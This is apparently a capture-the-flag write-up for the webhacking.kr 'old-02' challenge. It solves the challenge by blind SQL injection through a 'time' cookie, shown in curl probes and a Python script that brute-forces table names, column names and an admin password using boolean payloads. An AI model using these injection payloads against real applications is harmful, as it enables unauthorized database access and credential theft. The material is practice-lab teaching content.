# Old 02    SQLi (Blind via Cookie)

URL: [https://webhacking.kr/challenge/web-02/](https://webhacking.kr/challenge/web-02/)

![old-02.png](/assets/ctf/webhacking.kr/old-02.png)

```html
<!--
2024-08-03 05:27:33
-->
<h2>Restricted area</h2>Hello stranger. Your IP is logging...<!-- if you access admin.php i will kick your ass -->
```

Inspecting the requests, we get a new cookie called time.

![old-02-1.png](/assets/ctf/webhacking.kr/old-02-1.png)

`/admin.php` needs a password which we don't have:
```powershell
➜ curl https://webhacking.kr/challenge/web-02/admin.php -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -i
HTTP/1.1 200 OK
Date: Fri, 02 Aug 2024 20:32:45 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 81
Content-Type: text/html; charset=UTF-8

<form method=post>
type your secret password <input name=pw> <input type=submit>
```

It's odd to receive a useless cookie which specifies the datetime in html as comment, we are able to control the cookie:

![old-02-2.png](/assets/ctf/webhacking.kr/old-02-2.png)

Somehow SQLi is possible?..
```bash
➜ curl 'https://webhacking.kr/challenge/web-02/index.php' -b 'time=1 AND 1=1 -- -; PHPSESSID=hi4uvai5sde90encr0ktq6879f'
<!--
2070-01-01 09:00:01
-->
<h2>Restricted area</h2>Hello stranger. Your IP is logging...<!-- if you access admin.php i will kick your ass -->
➜ curl 'https://webhacking.kr/challenge/web-02/index.php' -b 'time=1 AND 2=1 -- -; PHPSESSID=hi4uvai5sde90encr0ktq6879f'
<!--
2070-01-01 09:00:00
-->
<h2>Restricted area</h2>Hello stranger. Your IP is logging...<!-- if you access admin.php i will kick your ass -->
```

Brute force the database:
```python
import string
import requests

URL = 'https://webhacking.kr/challenge/web-02/index.php'
CHARSET = string.ascii_lowercase + string.digits + '{}?!,_'
COOKIES = {'PHPSESSID': 'hi4uvai5sde90encr0ktq6879f', 'time': 1337}
SUCCESS = '2070-01-01 09:00:01'

class Payloads:
    TABLES   = "1 AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '{}%'#"
    COLUMNS  = "1 AND (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{}') LIKE '{}%'#"
    PASSWORD = "1 AND SUBSTR((SELECT {} FROM {} LIMIT 1),{},1)='{}'#"

def fetch(cookies):
    resp = requests.get(URL, cookies=cookies)
    if SUCCESS in resp.text:
        return True
    
    return False


tables = 'admin_area_pw,log'
table = 'admin_area_pw'
columns = 'pw'
password = 'kudos_to_beistlab'
while True:
    password_i = len(password) + 1
    for c in CHARSET:
        try:
            # print(f'{c=} | {tables=} | {columns=}')
            # guess = fetch({**COOKIES, 'time': Payloads.TABLES.format(tables + c)})

            # print(f'{c=} | {table=} | {columns=}')
            # guess = fetch({**COOKIES, 'time': Payloads.COLUMNS.format(table, columns + c)})
            
            print(f'{c=} | {table=} | {columns=} | {password=}')
            guess = fetch({**COOKIES, 'time': Payloads.PASSWORD.format(columns, table, password_i, c)})

            if guess:
                # tables += c
                # columns += c
                password += c
                break
        except requests.exceptions.ConnectionError:
            print(f'ConnectionError: {c}')
        except KeyboardInterrupt:
            exit(1)
    else:
        break
```

> **Note**: Script is plug and play style, and not fully automatic 🥴

> **Note**: For some reason server didn't like *Asnyc* code so this MF took ages to brute.

> **Note**: Don't use `LIKE` operator on column values as it's not case sensitive.

Submit the password at `/admin.php`

![old-02-3.png](/assets/ctf/webhacking.kr/old-02-3.png)